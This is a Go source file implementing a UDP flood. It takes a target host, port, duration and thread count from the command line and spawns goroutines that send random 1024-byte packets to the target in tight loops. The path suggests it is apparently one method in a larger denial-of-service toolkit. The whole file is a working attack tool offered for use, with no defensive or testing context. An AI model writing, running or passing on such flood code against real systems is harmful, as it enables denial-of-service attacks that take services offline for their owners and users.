// methods/golang/udp_flood.go
package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

type UDPFlood struct {
	Target   string
	Port     int
	Duration int
	Threads  int
	Running  bool
	Wg       sync.WaitGroup
}

func NewUDPFlood(target string, port, duration, threads int) *UDPFlood {
	return &UDPFlood{
		Target:   target,
		Port:     port,
		Duration: duration,
		Threads:  threads,
		Running:  false,
	}
}

func (u *UDPFlood) floodWorker() {
	defer u.Wg.Done()

	targetAddr := fmt.Sprintf("%s:%d", u.Target, u.Port)
	udpAddr, err := net.ResolveUDPAddr("udp", targetAddr)
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		return
	}
	defer conn.Close()

	packetSize := 1024
	packet := make([]byte, packetSize)
	rand.Read(packet)

	for u.Running {
		for i := 0; i < 100; i++ {
			conn.Write(packet)
		}
		time.Sleep(10 * time.Millisecond)
	}
}

func (u *UDPFlood) Start() {
	u.Running = true

	for i := 0; i < u.Threads; i++ {
		u.Wg.Add(1)
		go u.floodWorker()
	}

	time.Sleep(time.Duration(u.Duration) * time.Second)
	u.Running = false
	u.Wg.Wait()
}

func main() {
	if len(os.Args) != 5 {
		fmt.Println("Usage: udp_flood <target> <port> <duration> <threads>")
		os.Exit(1)
	}

	target := os.Args[1]
	port, _ := strconv.Atoi(os.Args[2])
	duration, _ := strconv.Atoi(os.Args[3])
	threads, _ := strconv.Atoi(os.Args[4])

	flood := NewUDPFlood(target, port, duration, threads)
	flood.Start()
}